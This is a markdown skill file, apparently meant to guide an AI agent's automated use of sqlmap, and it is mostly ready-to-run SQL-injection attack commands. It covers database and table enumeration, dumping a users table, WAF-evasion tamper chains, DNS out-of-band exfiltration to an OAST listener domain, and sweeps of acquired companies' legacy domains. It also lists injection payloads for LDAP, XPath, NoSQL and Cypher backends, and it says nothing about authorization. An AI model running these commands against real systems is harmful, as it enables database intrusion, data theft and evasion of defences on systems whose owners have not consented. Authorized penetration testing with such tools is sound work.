---
name: sqlmap
description: sqlmap target syntax, non-interactive execution, and common validation/enumeration workflows.
depends_on: []
---

# sqlmap CLI Playbook

Official docs:
- https://github.com/sqlmapproject/sqlmap/wiki/usage
- https://sqlmap.org

Canonical syntax:
`sqlmap -u "<target_url_with_params>" [options]`

High-signal flags:
- `-u, --url <url>` target URL
- `-r <request_file>` raw HTTP request input
- `-p <param>` test specific parameter(s)
- `--batch` non-interactive mode
- `--level <1-5>` test depth
- `--risk <1-3>` payload risk profile
- `--threads <n>` concurrency
- `--technique <letters>` technique selection
- `--forms` parse and test forms from target page
- `--cookie <cookie>` and `--headers <headers>` authenticated context
- `--timeout <seconds>` and `--retries <n>` transport stability
- `--tamper <scripts>` WAF/input-filter evasion
- `--random-agent` randomize user-agent
- `--ignore-proxy` bypass configured proxy
- `--dbs`, `-D <db> --tables`, `-D <db> -T <table> --columns`, `-D <db> -T <table> -C <cols> --dump`
- `--flush-session` clear cached scan state

Agent-safe baseline for automation:
`sqlmap -u "https://target.tld/item?id=1" -p id --batch --level 2 --risk 1 --threads 5 --timeout 10 --retries 1 --random-agent`

Common patterns:
- Baseline injection check:
  `sqlmap -u "https://target.tld/item?id=1" -p id --batch --level 2 --risk 1 --threads 5`
- POST parameter testing:
  `sqlmap -u "https://target.tld/login" --data "user=admin&pass=test" -p pass --batch --level 2 --risk 1`
- Form-driven testing:
  `sqlmap -u "https://target.tld/login" --forms --batch --level 2 --risk 1 --random-agent`
- Enumerate DBs:
  `sqlmap -u "https://target.tld/item?id=1" -p id --batch --dbs`
- Enumerate tables in DB:
  `sqlmap -u "https://target.tld/item?id=1" -p id --batch -D appdb --tables`
- Dump selected columns:
  `sqlmap -u "https://target.tld/item?id=1" -p id --batch -D appdb -T users -C id,email,role --dump`

Critical correctness rules:
- Always include `--batch` in automation to avoid interactive prompts.
- Keep target parameter explicit with `-p` when possible.
- Use `--flush-session` when retesting after request/profile changes.
- Start conservative (`--level 1-2`, `--risk 1`) and escalate only when needed.

Usage rules:
- Keep authenticated context (`--cookie`/`--headers`) aligned with manual validation state.
- Prefer narrow extraction (`-D/-T/-C`) over broad dump-first behavior.
- Do not use `-h`/`--help` during normal execution unless absolutely necessary.

Failure recovery:
- If results conflict with manual testing, rerun with `--flush-session`.
- If blocked by filtering/WAF, reduce `--threads` and test targeted `--tamper` chains.
- If initial detection misses likely injection, increment `--level`/`--risk` gradually.

If uncertain, query web_search with:
`site:github.com/sqlmapproject/sqlmap/wiki/usage sqlmap <flag>`

## Corpus-Derived Advanced Techniques

### OOB DNS Exfiltration Channel

When in-band detection fails (heavy WAF, blind with no time oracle), use DNS exfiltration:
```bash
sqlmap -u "https://target.tld/item?id=1" -p id --batch \
  --dns-domain=sqli.your-oast-root.oast.fun --level 3 --risk 2
```
Requires an interactsh or Burp Collaborator listener. Works on MSSQL (xp_dirtree), MySQL (LOAD_FILE to UNC), Oracle (UTL_HTTP), PostgreSQL (COPY TO PROGRAM / dblink).

### Non-SQL Injection Targets

Not every backend is SQL. Fingerprint first, then choose the right tool:
- **Solr/Lucene**: faceted JSON responses, `q`/`fq`/`fl` parameters. Test: `q=*:*&fl=*`
- **Neo4j/Cypher**: `MATCH (n) RETURN n LIMIT 1` in string parameters
- **LDAP**: `*)(uid=*))(|(uid=*` in search/filter fields
- **XPath**: `' or 1=1 or '` in XML-consuming parameters
- **NoSQL (MongoDB)**: `{"$gt":""}` or `[$ne]=` in JSON/form parameters

sqlmap handles SQL dialects. For non-SQL stores, use manual payloads or nuclei templates.

### Integer-Context Blind SQLi Probing

For numeric parameters, skip quote-based payloads entirely:
```bash
# Arithmetic oracle: if id=5 works, test id=6-1 and id=4+1
sqlmap -u "https://target.tld/item?id=5" -p id --batch \
  --technique=B --level 3 --prefix="" --suffix=""
```
Manual quick-check: `id=5 AND 1=1` vs `id=5 AND 1=2`. Different response = injectable.

### ORDER BY / GROUP BY Injection

ORM frameworks often protect WHERE but leave ORDER/SORT unparameterized:
```bash
sqlmap -u "https://target.tld/users?sort=name" -p sort --batch \
  --level 3 --risk 2 --technique=E
```
Also test `group_by`, `order`, `sort_by`, `orderBy` parameters across any API.

### WAF Bypass Tamper Chains

Escalate tamper scripts when WAF blocks initial detection:
```bash
# Progressive tamper escalation
sqlmap -u "https://target.tld/item?id=1" -p id --batch \
  --tamper=space2comment,between,randomcase --level 3 --risk 2

# Heavy evasion
sqlmap -u "https://target.tld/item?id=1" -p id --batch \
  --tamper=charencode,space2mssqlblank,between,randomcase \
  --random-agent --delay=2
```

### Raw Request File Workflow

For complex authenticated or multipart requests, save from proxy and replay:
```bash
# Save request from Burp/mitmproxy as request.txt, then:
sqlmap -r request.txt -p vulnerable_param --batch \
  --level 2 --risk 1 --flush-session
```
This preserves exact headers, cookies, and body encoding.

### Acquired-Company Infrastructure Sweep

For programs with many acquired properties, enumerate legacy domains first:
```bash
# Enumerate subdomains of acquired companies, then test each
sqlmap -u "https://legacy.acquired-domain.tld/api?id=1" -p id \
  --batch --level 3 --risk 2 --random-agent
```
Acquired domains frequently run older stacks with less hardening.

### WordPress Plugin SQLi Pipeline

For WordPress targets, enumerate AJAX actions and test each handler:
```bash
# After discovering wp_ajax_nopriv_* action:
sqlmap -u "https://target.tld/wp-admin/admin-ajax.php" \
  --data "action=plugin_action&param=1" -p param \
  --batch --level 3 --risk 2
```
